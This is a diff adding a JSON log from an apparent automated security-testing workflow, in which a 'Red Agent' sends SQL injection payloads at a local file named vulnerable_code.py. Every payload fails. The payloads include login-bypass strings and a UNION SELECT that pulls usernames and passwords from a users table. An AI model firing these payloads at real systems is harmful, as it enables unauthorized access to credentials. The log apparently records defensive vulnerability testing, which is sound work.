@@ -1,0 +1,167 @@
+{
+    "workflow_id": "6f1708a2-4430-4af5-95af-d82ec03f144d",
+    "events": [
+        {
+            "timestamp": "2026-03-06T10:10:40.022035",
+            "agent": "Orchestrator",
+            "action": "Workflow Started",
+            "details": {
+                "workflow_id": "6f1708a2-4430-4af5-95af-d82ec03f144d",
+                "code_path": "E:\\sentinel\\Sentinel\\vulnerable_code.py",
+                "vulnerability_type": "SQL Injection",
+                "exploit_success": false,
+                "exploit_payloads": [],
+                "patch_diff": null,
+                "patch_explanation": null,
+                "verification_status": "PENDING",
+                "verification_reasoning": null,
+                "iteration_count": 0,
+                "max_iterations": 3
+            }
+        },
+        {
+            "timestamp": "2026-03-06T10:10:40.067933",
+            "agent": "Red Agent",
+            "action": "Attacking",
+            "details": {
+                "message": "Starting attack simulation"
+            }
+        },
+        {
+            "timestamp": "2026-03-06T10:10:40.082804",
+            "agent": "Red Agent",
+            "action": "Execution",
+            "details": {
+                "message": "Executing payloads against E:\\sentinel\\Sentinel\\vulnerable_code.py via TestHarness..."
+            }
+        },
+        {
+            "timestamp": "2026-03-06T10:10:44.196832",
+            "agent": "Red Agent",
+            "action": "Payload Sent",
+            "details": {
+                "payload": "' OR '1'='1"
+            }
+        },
+        {
+            "timestamp": "2026-03-06T10:10:46.234041",
+            "agent": "Red Agent",
+            "action": "Payload Failed",
+            "details": {
+                "output": null,
+                "error": null
+            }
+        },
+        {
+            "timestamp": "2026-03-06T10:10:46.234543",
+            "agent": "Red Agent",
+            "action": "Payload Sent",
+            "details": {
+                "payload": "admin' --"
+            }
+        },
+        {
+            "timestamp": "2026-03-06T10:10:48.283179",
+            "agent": "Red Agent",
+            "action": "Payload Failed",
+            "details": {
+                "output": null,
+                "error": null
+            }
+        },
+        {
+            "timestamp": "2026-03-06T10:10:48.283895",
+            "agent": "Red Agent",
+            "action": "Payload Sent",
+            "details": {
+                "payload": "admin' #"
+            }
+        },
+        {
+            "timestamp": "2026-03-06T10:10:50.350481",
+            "agent": "Red Agent",
+            "action": "Payload Failed",
+            "details": {
+                "output": null,
+                "error": null
+            }
+        },
+        {
+            "timestamp": "2026-03-06T10:10:50.351829",
+            "agent": "Red Agent",
+            "action": "Payload Sent",
+            "details": {
+                "payload": "admin' /*"
+            }
+        },
+        {
+            "timestamp": "2026-03-06T10:10:52.416508",
+            "agent": "Red Agent",
+            "action": "Payload Failed",
+            "details": {
+                "output": null,
+                "error": null
+            }
+        },
+        {
+            "timestamp": "2026-03-06T10:10:52.418689",
+            "agent": "Red Agent",
+            "action": "Payload Sent",
+            "details": {
+                "payload": "' UNION SELECT 1,2,3,4,5 --"
+            }
+        },
+        {
+            "timestamp": "2026-03-06T10:10:54.526214",
+            "agent": "Red Agent",
+            "action": "Payload Failed",
+            "details": {
+                "output": null,
+                "error": null
+            }
+        },
+        {
+            "timestamp": "2026-03-06T10:10:54.527811",
+            "agent": "Red Agent",
+            "action": "Payload Sent",
+            "details": {
+                "payload": "' UNION SELECT 1,username,password,active,data FROM users WHERE username='admin' --"
+            }
+        },
+        {
+            "timestamp": "2026-03-06T10:10:56.566321",
+            "agent": "Red Agent",
+            "action": "Payload Failed",
+            "details": {
+                "output": null,
+                "error": null
+            }
+        },
+        {
+            "timestamp": "2026-03-06T10:10:56.571599",
+            "agent": "Red Agent",
+            "action": "Failed",
+            "details": {
+                "message": "All payloads failed. Vulnerability might be patched."
+            }
+        },
+        {
+            "timestamp": "2026-03-06T10:10:56.587325",
+            "agent": "Orchestrator",
+            "action": "Workflow Completed",
+            "details": {
+                "workflow_id": "6f1708a2-4430-4af5-95af-d82ec03f144d",
+                "code_path": "E:\\sentinel\\Sentinel\\vulnerable_code.py",
+                "vulnerability_type": "SQL Injection",
+                "exploit_success": false,
+                "exploit_payloads": [],
+                "patch_diff": null,
+                "patch_explanation": null,
+                "verification_status": "PENDING",
+                "verification_reasoning": null,
+                "iteration_count": 0,
+                "max_iterations": 3
+            }
+        }
+    ]
+}
